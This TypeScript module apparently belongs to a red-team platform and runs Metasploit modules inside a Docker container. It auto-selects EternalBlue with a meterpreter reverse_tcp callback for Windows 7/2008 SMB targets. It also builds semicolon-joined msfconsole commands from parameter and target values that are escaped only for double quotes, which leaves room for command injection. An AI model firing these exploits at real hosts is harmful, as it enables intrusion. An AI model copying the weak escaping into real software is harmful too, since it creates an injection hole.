import { dockerExecutor } from "./docker-executor";
import { db } from "../db";
import { securityTools } from "@shared/schema";
import { eq } from "drizzle-orm";

/**
 * Metasploit Module Executor
 * Handles execution of Metasploit modules with synchronous execution and output streaming
 */

export interface MetasploitModule {
  type: "exploit" | "payload" | "auxiliary" | "encoder" | "post" | "evasion" | "nop";
  path: string;
  parameters: Record<string, string>;
}

export interface ExecutionResult {
  success: boolean;
  output: string;
  stderr: string;
  exitCode: number;
  duration: number;
  moduleUsed: string;
  timestamp: string;
}

class MetasploitExecutor {
  private executionLocks = new Map<string, boolean>();

  /**
   * Check if a tool execution is currently locked
   */
  isLocked(toolId: string): boolean {
    return this.executionLocks.get(toolId) || false;
  }

  /**
   * Lock a tool for execution
   */
  private lock(toolId: string): void {
    this.executionLocks.set(toolId, true);
  }

  /**
   * Unlock a tool after execution
   */
  private unlock(toolId: string): void {
    this.executionLocks.delete(toolId);
  }

  /**
   * Execute a Metasploit module synchronously
   */
  async execute(
    toolId: string,
    module: MetasploitModule,
    targetValue: string
  ): Promise<ExecutionResult> {
    // Check if already locked
    if (this.isLocked(toolId)) {
      throw new Error("Another execution is already in progress for this tool");
    }

    // Lock the tool
    this.lock(toolId);

    const startTime = Date.now();
    const timestamp = new Date().toISOString();

    try {
      // Update tool status to running
      await db
        .update(securityTools)
        .set({
          status: "running",
          lastUsed: new Date(),
        })
        .where(eq(securityTools.id, toolId));

      // Build msfconsole command
      const command = this.buildMsfCommand(module, targetValue);
      
      console.log(`[Metasploit] Executing: ${command.join(" ")}`);

      // Execute in Docker container
      const result = await dockerExecutor.exec("rtpi-tools", command, {
        timeout: 600000, // 10 minutes timeout
      });

      const duration = Date.now() - startTime;

      // Parse result
      const executionResult: ExecutionResult = {
        success: result.exitCode === 0,
        output: result.stdout || "",
        stderr: result.stderr || "",
        exitCode: result.exitCode,
        duration,
        moduleUsed: `${module.type}/${module.path}`,
        timestamp,
      };

      // Update tool status back to available and store execution result
      const tool = await db
        .select()
        .from(securityTools)
        .where(eq(securityTools.id, toolId))
        .limit(1);

      const currentMetadata = tool[0]?.metadata || {};
      const updatedMetadata = {
        ...currentMetadata,
        metasploit: {
          ...(currentMetadata as any)?.metasploit,
          lastExecution: {
            timestamp,
            success: executionResult.success,
            module: executionResult.moduleUsed,
            duration,
          },
        },
      };

      await db
        .update(securityTools)
        .set({
          status: "available",
          metadata: updatedMetadata,
        })
        .where(eq(securityTools.id, toolId));

      return executionResult;
    } catch (error) {
      const duration = Date.now() - startTime;
      const errorMsg = error instanceof Error ? error.message : String(error);

      // Reset tool status on error
      await db
        .update(securityTools)
        .set({ status: "available" })
        .where(eq(securityTools.id, toolId));

      return {
        success: false,
        output: "",
        stderr: errorMsg,
        exitCode: 1,
        duration,
        moduleUsed: `${module.type}/${module.path}`,
        timestamp,
      };
    } finally {
      // Always unlock
      this.unlock(toolId);
    }
  }

  /**
   * Build msfconsole command from module and parameters
   */
  private buildMsfCommand(
    module: MetasploitModule,
    targetValue: string
  ): string[] {
    const fullModulePath = `${module.type}/${module.path}`;
    
    // Build msfconsole resource script commands
    const commands: string[] = [
      `use ${fullModulePath}`,
    ];

    // Add RHOST parameter (target)
    if (targetValue) {
      commands.push(`set RHOST ${targetValue}`);
    }

    // Add all other parameters
    for (const [key, value] of Object.entries(module.parameters)) {
      if (key !== "RHOST" && value) {
        // Escape quotes in value
        const escapedValue = value.replace(/"/g, '\\"');
        commands.push(`set ${key} ${escapedValue}`);
      }
    }

    // Add execution command based on module type
    if (module.type === "auxiliary") {
      commands.push("run");
    } else if (module.type === "exploit") {
      commands.push("exploit");
    } else if (module.type === "payload") {
      commands.push("generate");
    }

    // Exit msfconsole
    commands.push("exit");

    // Join commands with semicolons
    const commandString = commands.join("; ");

    // Return as array for docker exec
    return ["msfconsole", "-q", "-x", commandString];
  }

  /**
   * Get module information (options, description, etc.)
   */
  async getModuleInfo(moduleType: string, modulePath: string): Promise<any> {
    const fullPath = `${moduleType}/${modulePath}`;
    
    try {
      const command = ["msfconsole", "-q", "-x", `info ${fullPath}; exit`];
      const result = await dockerExecutor.exec("rtpi-tools", command, {
        timeout: 30000, // 30 seconds
      });

      return this.parseModuleInfo(result.stdout);
    } catch (error) {
      console.error("Failed to get module info:", error);
      return null;
    }
  }

  /**
   * Parse module info output from msfconsole
   */
  private parseModuleInfo(output: string): any {
    const info: any = {
      name: "",
      description: "",
      author: [],
      platform: [],
      rank: "",
      options: [],
      references: [],
    };

    const lines = output.split("\n");
    let currentSection = "";
    let collectingOptions = false;

    for (const line of lines) {
      const trimmed = line.trim();

      if (trimmed.startsWith("Name:")) {
        info.name = trimmed.replace("Name:", "").trim();
      } else if (trimmed.includes("Description:")) {
        currentSection = "description";
      } else if (currentSection === "description" && trimmed && !trimmed.startsWith("Module")) {
        info.description = trimmed;
        currentSection = "";
      } else if (trimmed.includes("Author:")) {
        currentSection = "author";
      } else if (currentSection === "author" && trimmed && !trimmed.startsWith("Platform")) {
        info.author.push(trimmed);
      } else if (trimmed.includes("Platform:")) {
        const platforms = trimmed.replace("Platform:", "").trim().split(",");
        info.platform = platforms.map((p) => p.trim());
        currentSection = "";
      } else if (trimmed.includes("Rank:")) {
        const rankMatch = trimmed.match(/Rank:\s+(\w+)/);
        if (rankMatch) {
          info.rank = rankMatch[1];
        }
      } else if (trimmed.includes("Basic options:") || trimmed.includes("Module options")) {
        collectingOptions = true;
        currentSection = "options";
      } else if (collectingOptions && trimmed.includes("Name") && trimmed.includes("Current Setting")) {
        // Skip header
        continue;
      } else if (collectingOptions && trimmed.includes("----")) {
        // Skip separator
        continue;
      } else if (collectingOptions && trimmed && !trimmed.startsWith("Payload") && !trimmed.startsWith("Description")) {
        // Parse option line
        const parts = trimmed.split(/\s{2,}/);
        if (parts.length >= 3) {
          info.options.push({
            name: parts[0],
            current: parts[1] || "",
            required: parts[2] === "yes",
            description: parts[3] || "",
          });
        }
      } else if (trimmed.includes("References:")) {
        collectingOptions = false;
        currentSection = "references";
      } else if (currentSection === "references" && trimmed.match(/^\s*https?:\/\//)) {
        info.references.push(trimmed);
      }
    }

    return info;
  }

  /**
   * Auto-select appropriate module based on target reconnaissance data
   */
  selectModuleForTarget(
    targetData: any,
    _availableModules: any
  ): MetasploitModule | null {
    const services = targetData.discoveredServices || [];
    const metadata = targetData.metadata || {};

    // Determine OS/platform from metadata
    const os = (metadata.os || "").toLowerCase();
    const openPorts = metadata.openPorts || [];

    // Logic to select appropriate exploit/auxiliary module
    if (services.length > 0) {
      // Check for common vulnerable services
      for (const service of services) {
        const serviceName = service.name?.toLowerCase() || "";
        const port = service.port;

        // SMB vulnerabilities
        if ((serviceName.includes("smb") || port === 445) && os.includes("windows")) {
          // Check for EternalBlue if Windows 7/2008
          if (
            os.includes("windows 7") ||
            os.includes("windows server 2008") ||
            os.includes("win7")
          ) {
            return {
              type: "exploit",
              path: "windows/smb/ms17_010_eternalblue",
              parameters: {
                PAYLOAD: "windows/meterpreter/reverse_tcp",
                LHOST: metadata.attackerIp || "0.0.0.0",
                LPORT: "4444",
              },
            };
          }
        }

        // SSH service - use scanner
        if (serviceName.includes("ssh") || port === 22) {
          return {
            type: "auxiliary",
            path: "scanner/ssh/ssh_version",
            parameters: {},
          };
        }

        // HTTP/HTTPS - web scanner
        if (serviceName.includes("http") || port === 80 || port === 443) {
          return {
            type: "auxiliary",
            path: "scanner/http/http_version",
            parameters: {
              RPORT: String(port),
            },
          };
        }
      }
    }

    // Default to port scanner if no specific module found
    return {
      type: "auxiliary",
      path: "scanner/portscan/tcp",
      parameters: {
        PORTS: openPorts.join(",") || "1-1000",
      },
    };
  }
}

export const metasploitExecutor = new MetasploitExecutor();
